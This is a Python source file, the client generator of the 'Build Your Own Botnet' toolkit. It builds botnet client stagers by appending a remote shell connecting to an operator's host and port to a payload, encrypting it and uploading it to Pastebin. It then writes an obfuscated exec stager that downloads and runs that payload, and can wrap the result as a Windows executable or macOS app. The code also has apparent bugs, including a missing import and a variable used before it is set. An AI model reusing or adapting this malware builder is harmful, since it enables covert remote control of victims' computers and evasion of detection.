#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard library
import os
import sys
import json
import zlib
import base64
import urllib
import urllib2
import marshal
import colorama
import argparse
import subprocess

# byob
try:
    from modules import security, util
except:
    from .modules import security, util


colorama.init(autoreset=False)


def exe(options, filename):
    try:
        filename= os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', filename)
        pyname  = os.path.basename(filename)
        name    = os.path.splitext(pyname)[0]
        dist    = os.path.dirname(filename)
        key     = util.variable(16)
        icon    = options.icon if os.path.isfile('resources/icon/%s.ico' % options.icon) else None
        pkgs    = list(set([i.strip().split()[1] for i in open(filename).read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import'] + [i.strip().split()[1] for i in open('modules/payload.py','r').read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import' if len(str(i.strip().split()[1])) < 35]))
        spec    = open('resources/pyinstaller.spec','r').read().replace('[HIDDEN_IMPORTS]', str(pkgs)).replace('[ICON_PATH]', icon).replace('[PY_FILE]', pyname).replace('[DIST_PATH]', dist).replace('[NAME]', name).replace('[128_BIT_KEY]', key)
        fspec   = os.path.join(dist, name + '.spec')
        with file(fspec, 'w') as fp:
            fp.write(spec)
        make  = subprocess.Popen('%s -m PyInstaller %s' % (sys.executable, fspec), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
        exe   = os.path.join(os.path.join(dist, 'dist'), name + ('.exe' if os.name == 'nt' else ''))
        _  = map(util.delete, (filename, fspec, os.path.join(dist, 'build')))
        return exe
    except Exception as e3:
        util.debug('exe error: {}'.format(str(e3)))


def app(options, filename):
    try:        
        iconFile        = options.icon if os.path.isfile('resources/icon/%s.ico' % options.icon) else None
        version         = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
        baseName        = os.path.basename(filename)
        bundleName      = os.path.splitext(baseName)[0]
        pkgPath         = os.path.join(basePath, 'PkgInfo')
        appPath         = os.path.join(os.getcwd(), '%.app' % bundleName)
        basePath        = os.path.join(appPath, 'Contents')
        distPath 	    = os.path.join(basePath, 'MacOS')
        rsrcPath        = os.path.join(basePath, 'Resources')
        plistPath       = os.path.join(rsrcPath, 'Info.plist')
        iconPath        = os.path.basename(iconFile)
        executable      = os.path.join(distPath, filename)
        bundleVersion   = '%s %s'  % (bundleName, version)
        bundleIdentity  = 'com.%s' % bundleName
        infoPlist       = open('resources/app.plist').read() % (baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
        os.makedirs(distPath)
        os.mkdir(rsrcPath)
        with file(pkgPath, "w") as fp:
            fp.write("APPL????")
        with file(plistPath, "w") as fw:
            fw.write(infoPlist)
        os.rename(filename, os.path.join(distPath, baseName))
        return appPath
    except Exception as e:
        util.debug("app error: {}".format(str(e)))


def py(options, payload='modules/payload.py', stager='modules/stager.py', **kwargs):
        api = {}
        for k,v in kwargs.items():
            if k in ('imgur', 'ftp', 'paste'):
                if v:
                    api[k] = v.split(',')
            
        key = base64.b64encode(os.urandom(16))

        if options.name:
            path = options.name
            if not path.endswith('.py'):
                path += '.py'
        else:
            path = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', 'byob_%s.py' % util.variable(3))

        with open(payload, 'r') as fp:
            payload = fp.read()            

        host    = options.host
        port    = options.port
        payload = payload + "\n\nif __name__ == '__main__':\n    _shell = shell(host='{}', port={}, **{})\n    _shell.run()".format(host, port, json.dumps(api))
        code    = security.encrypt_xor(payload, base64.b64decode(key), block_size=8, key_size=16, num_rounds=32, padding='\x00')
        diff    = round(float(100.0 * float(float(len(code))/float(len(payload)) - 1.0)))

        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Payload encryption complete")
        print(colorama.Fore.RESET + colorama.Style.DIM    + "    (Plaintext {:,} bytes {} to ciphertext {:,} bytes ({}% {})".format(len(payload), 'increased' if len(code) > len(payload) else 'reduced', len(code), diff, 'larger' if len(code) > len(payload) else 'smaller').ljust(80 - len("[+] ")))

        payload = code
        new_url = util.pastebin(payload)

        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Upload to Pastebin complete")
        print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes uploaded to: {}".format(len(payload), new_url).ljust(80 - len("[+] ")))

        with open(stager, 'r') as fp:
            stager  = fp.read().replace('__KEY__', key).replace('__PAYLOAD__', new_url)
            
        code    = "import zlib,base64,marshal;exec marshal.loads(zlib.decompress(base64.b64decode({})))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))))
        diff    =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stager)))))
        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Stager obfuscation and minification complete")
        print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stager), 'increased' if len(code) > len(stager) else 'reduced', len(code), diff, 'larger' if len(code) > len(stager) else 'smaller').ljust(80 - len("[+] ")))

        stager  = code
        with file(path, 'w') as fp:
            fp.write(stager)
            
        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " +  colorama.Fore.RESET + "Client stager generation complete")
        print(colorama.Fore.RESET + colorama.Style.DIM    + "    ({:,} bytes written to file: {})".format(len(stager), path).ljust(80 - len("[+] ")))   

        if options.type == 'exe':
            path = exe(options, path)
        elif options.type == 'app':
            path = app(options, path)
        return path

    
def main():
        parser = argparse.ArgumentParser(prog='client.py', description="Client Generator (Build Your Own Botnet)", version='0.4.7')
        parser.add_argument('type', action='store', help='python, executable, app bundle', choices=['py','exe','app'])
        parser.add_argument('host', action='store', type=str, help='server host')
        parser.add_argument('port', action='store', type=int, help='server port')
        parser.add_argument('--ftp', action='store', type=str, help='FTP host, username, password')
        parser.add_argument('--name', action='store', help='output file base name')
        parser.add_argument('--icon', action='store', help='*.ico, *.png, *.icns image file')
        parser.add_argument('--imgur', action='store', type=str, help='Imgur API key')
        parser.add_argument('--paste', action='store', type=str, help='Pastebin API key')
        options = parser.parse_args()
        kwargs  = dict(options._get_kwargs())
        return py(options, **kwargs)

if __name__ == '__main__':
    main()
